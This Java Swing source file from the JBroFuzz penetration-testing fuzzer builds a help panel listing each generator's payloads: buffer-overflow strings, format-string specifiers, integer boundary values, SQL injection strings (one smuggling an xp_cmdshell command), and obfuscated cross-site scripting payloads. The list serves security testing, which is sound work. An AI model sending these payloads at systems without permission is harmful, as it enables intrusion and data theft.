/**
 * MainDefinitionsPanel.java
 *
 * Java Bro Fuzzer. A stateless network protocol fuzzer for penetration tests.
 * It allows for the identification of certain classes of security bugs, by
 * means of creating malformed data and having the network protocol in question
 * consume the data.
 *
 * Copyright (C) 2006 yns000 (at) users. sourceforge. net
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA  02110-1301, USA.
 */
package jbrofuzz.ui;

import java.awt.event.*;
import javax.swing.*;
import java.awt.*;

import jbrofuzz.ui.util.*;
import jbrofuzz.fuzz.def.*;

/**
 *
 * @author subere@uncon.org
 * @version 0.2
 */
public class MainDefinitionsPanel
    extends JPanel {
  // The frame that the sniffing panel is attached
  private MainWindow m;
  // The JTable that holds all the data
  private JTextArea listTextArea;

  public MainDefinitionsPanel(MainWindow m) {
    super();
    setLayout(null);
    setBorder(BorderFactory.createCompoundBorder(
        BorderFactory.createTitledBorder(" Definitions "),
        BorderFactory.createEmptyBorder(1, 1, 1, 1)));

    this.m = m;
    // Define the JPanel
    JPanel listPanel = new JPanel();

    listPanel.setBorder(BorderFactory.createCompoundBorder(
        BorderFactory.createTitledBorder(" Fuzzing Generators "),
        BorderFactory.createEmptyBorder(1, 1, 1, 1)));
    // Set the bounds
    listPanel.setBounds(10, 90, 870, 370);

    listTextArea = new JTextArea();
    listTextArea.setFont(new Font("Verdana", Font.PLAIN, 14));
    listTextArea.setEditable(false);
    listTextArea.setLineWrap(true);
    listTextArea.setWrapStyleWord(true);
    JScrollPane listTextScrollPane = new JScrollPane(listTextArea);
    listTextScrollPane.setVerticalScrollBarPolicy(JScrollPane.
                                                  VERTICAL_SCROLLBAR_AS_NEEDED);
    listTextScrollPane.setHorizontalScrollBarPolicy(JScrollPane.
        HORIZONTAL_SCROLLBAR_NEVER);
    listTextScrollPane.setPreferredSize(new Dimension(860, 340));
    listPanel.add(listTextScrollPane);

    add(listPanel);
    /**
     * @todo Update the text so that to get the list of generators from the
     * format page.
     */
    listTextArea.setText(
        "The following generators are available, provided a user has selected " +
        "(highlighted) part of the message request within the fuzzing panel:\n" +
        "\t{ZER, BFO, FSE, INT, BIN, OCT, DEC, HEX, SQL}\n\n" +
        "Below are the details of each one:\n\n" +
        "ZER (Request as is)\n" +
        "Zero Generator : Transmit a single request, as is, without the inclusion " +
        "of any fuzzing points\n\n\n" +
        "BFO (Buffer Overflows)\n" +
        "Check for buffer overflows : Transmit the following " +
        DefBufferOverflows.LENGTH +
        " requests, replacing the selected (highlighted) " +
        "part of the message request\n" +
        "Typically, an increasing list of 'A's is attempting for each request.\n" +
        "The requests made are:\n" +
        "A x 5\n" +
        "A x 17\n" +
        "A x 33\n" +
        "A x 65\n" +
        "A x 129\n" +
        "A x 257\n" +
        "A x 513\n" +
        "A x 1024\n" +
        "A x 2049\n" +
        "A x 4097\n" +
        "A x 8193\n" +
        "A x 12288\n" +
        "\n\n" +
        "FSE (Format String Errors)\n" +
        "Check for format string errors : Transmit the following " +
        DefFormatStringErrors.LENGTH +
        " requests, replacing the selected (highlighted) " +
        "part of the message request\n" +
        "The following requests will be made:\n" +
        "%s%p%x%d\n" +
        ".1024d\n" +
        "%.2049d\n" +
        "%p%p%p%p\n" +
        "%x%x%x%x\n" +
        "%d%d%d%d\n" +
        "%s%s%s%s\n" +
        "%99999999999s\n" +
        "%08x\n" +
        "%%20d\n" +
        "%%20n\n" +
        "%%20x\n" +
        "%%20s\n" +
        "%s%s%s%s%s%s%s%s%s%s\n" +
        "%p%p%p%p%p%p%p%p%p%p\n" +
        "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%\n" +
        "%s x 123\n" +
        "%x x 255\n" +
        "\n\n" +
        "INT (Integer Overflows)\n" +
        "Check for integer overflows : Transmit the following " +
        DefIntegerOverflows.LENGTH +
        " requests, replacing the selected (highlighted) " +
        "part of the message request\n" +
        "-1\n" +
        "0\n" +
        "0x100\n" +
        "0x1000\n" +
        "0x3fffffff\n" +
        "0x7ffffffe\n" +
        "0x7fffffff\n" +
        "0x80000000\n" +
        "0xfffffffe\n" +
        "0xffffffff\n" +
        "0x10000\n" +
        "0x100000\n" +
        "\n\n" +
        "BIN (Binary Fuzz Type)\n" +
        "Binary Generator : Replace each selected character with characters from " +
        "the set \n{0, 1}, running through all possible iterations\n" +
        "A total of n selected characters would generate 2^n requests\n\n\n" +
        "OCT (Octal Fuzz Type)\n" +
        "Octal Generator : Replace each selected character with characters from " +
        "the set \n{0, 1, 2, 3, 4, 5, 6, 7}, running through all possible iterations\n" +
        "A total of n selected characters would generate 8^n requests\n\n\n" +
        "DEC (Decimal Fuzz Type)\n" +
        "Decimal Generator : Replace each selected character with characters from " +
        "the set \n{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}, running through all possible iterations\n" +
        "A total of n selected characters would generate 10^n requests\n\n\n" +
        "HEX (Hexadecimal Fuzz Type)\n" +
        "Hexadecimal Generator : Replace each selected character with characters from " +
        "the set \n{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, a, b, c, d, e, f}, running through all possible iterations\n" +
        "A total of n selected characters would generate 16^n requests.\n" +
        "This generator has been tested for 8 characters, generating a total of 4294967296 requests.\n\n\n" +
        "SQL (SQL Injections)\n" +
        "Check for SQL injection : Transmit the following " +
        DefSqlInjections.LENGTH +
        " requests, replacing the selected (highlighted) " +
        "part of the message request\n" +
        "The following requests are made:\n" +
        "a'\n" +
        "?\n" +
        "' or 1=1\n" +
        "‘ or 1=1 --\n" +
        "x' AND userid IS NULL; --\n" +
        "x' AND email IS NULL; --\n" +
        "anything' OR 'x'='x\n" +
        "x' AND 1=(SELECT COUNT(*) FROM tabname); --\n" +
        "x' AND members.email IS NULL; --\n" +
        "x' OR full_name LIKE '%Bob%\n" +
        "23 OR 1=1\n" +
        "'; exec master..xp_cmdshell 'ping 172.10.1.255'--\n\n\n" +
        "XSS (Cross Site Scripting)\n" +
        "Check for Cross Site Scripting : Transmit the following " +
        DefXSSInjections.LENGTH +
        " requests, replacing the selected (highlighted) " +
        "part of the message request\n" +
        "The following requests are made:\n" +
        "<IMG SRC=javascript:alert('XSS')>\n" +
        "<IMG SRC=JaVaScRiPt:alert('XSS')>\n" +
        "<IMG SRC=`javascript:alert(\"XSS says, 'XSS'\")`>\n" +
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\n" +
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n" +
        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n" +
        "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n" +
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n" +
        "perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out\n" +
        "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n" +
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n" +
        "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n\n\n"

        );
    listTextArea.setCaretPosition(0);
  }

  public MainWindow getMainWindow() {
    return m;
  }
}
